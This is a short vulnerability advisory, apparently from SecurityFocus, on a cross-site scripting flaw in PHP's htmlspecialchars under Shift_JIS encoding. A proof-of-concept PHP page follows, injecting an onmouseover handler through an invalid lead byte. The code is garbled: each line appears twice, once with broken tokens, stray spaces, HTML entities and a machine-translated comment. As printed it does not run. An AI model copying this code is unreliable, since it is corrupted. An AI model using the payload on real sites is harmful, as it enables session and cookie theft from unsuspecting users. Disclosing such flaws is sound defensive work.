source: http://www.securityfocus.com/bid/37389/info
 
PHP is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
 
An attacker may leverage this issue to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
 
NOTE: In some configurations, attackers may exploit this issue to carry out HTML-injection attacks.
 
Versions prior to PHP 5.2.12 are vulnerable. 

<? php

$ _GET [ &#039; a1 &#039; ] = " \xf0 "; // \xf0 - \xfc で可能 $ _GET [ &#039;A1&#039;] = "\ xf0"; / / \ xf0 - \ xfc possible
$ _GET [ &#039; a2 &#039; ] = "  href=dummy onmouseover=alert(document.title) dummy=dummy "; $ _GET [ &#039;A2&#039;] = "href = dummy onmouseover = alert (document.title) dummy = dummy";

header ( " Content-Type:text/html; charset=Shift_JIS " ) ; header ( "Content-Type: text / html; charset = Shift_JIS");
?> ? "
< html > <Html>
< head >< title > Shift_JIS test </ title ></ head > <Head> <title> Shift_JIS test </ title> </ head>
< body > <Body>
< p >< a <P> <a   title = " <?php echo htmlspecialchars ( $ _GET [ &#039; a1 &#039; ] , ENT_QUOTES, &#039; SJIS &#039; ) ?> " title = "<? php echo htmlspecialchars ($ _GET [ &#039;a1&#039;], ENT_QUOTES, &#039;SJIS&#039;)?>"   href = " <?php echo htmlspecialchars ( $ _GET [ &#039; a2 &#039; ] , ENT_QUOTES, &#039; SJIS &#039; ) ?> " > test </ a ></ p > href = "<? php echo htmlspecialchars ($ _GET [ &#039;a2&#039;], ENT_QUOTES, &#039;SJIS&#039;)?>"> test </ a> </ p>
</ body > </ Body>
</ html > </ Html>